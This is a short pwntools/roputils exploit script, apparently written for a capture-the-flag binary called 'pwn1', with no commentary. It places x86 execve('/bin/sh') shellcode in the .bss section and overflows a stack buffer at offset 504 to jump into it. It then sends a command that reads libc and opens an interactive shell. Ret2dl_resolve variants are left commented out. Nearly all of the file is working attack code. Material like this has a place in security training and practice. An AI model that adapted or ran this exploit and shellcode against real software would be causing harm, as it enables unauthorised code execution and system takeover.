from roputils import *
import pwn
# pwn.context(log_level="debug")
fpath = "./pwn1"
offset = 504

rop = ROP(fpath)
# print rop.fpath
# p = Proc(rop.fpath)
p = pwn.process(rop.fpath)
# p = pwn.remote("127.0.0.1",12346)
pwn.gdb.attach(p,"b*0x804859c\nc")

# addr_bss = rop.section('.bss')
addr_bss = 0x0804A080
# buf = rop.retfill(offset)


# buf = rop.dl_resolve_call(addr_bss+0x110, addr_bss)#
# buf += p32(addr_bss+len(buf)+0x10+0x4)
# buf += 'a'*0x10
# buf += rop.string('/bin/sh')

# buf += (0x110-len(buf))*'a'
# buf += rop.dl_resolve_data(addr_bss+0x110, 'system')
# buf += (0x1f4-len(buf))*'a'
buf =  p32(0x0804A080+4)+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
buf += (0x1f4-len(buf))*'a'
p.send(buf)


buf = 'a'*504
buf += p32(0x0804A080+4)
# buf += rop.call('read', 0, addr_bss, 0x100)
# buf += rop.dl_resolve_call(addr_bss+0x20+0x10, addr_bss)#
# buf += (0x1f4-len(buf))*'a'
p.sendline(buf)
data = p.recvuntil("\n")
print data
p.sendline("cat /lib/x86_64-linux-gnu/libc.so.6")
# with open("libc","wb") as f:
# 	data = p.recvuntil("\n")
# 	print data
# 	f.write(data)

p.interactive()
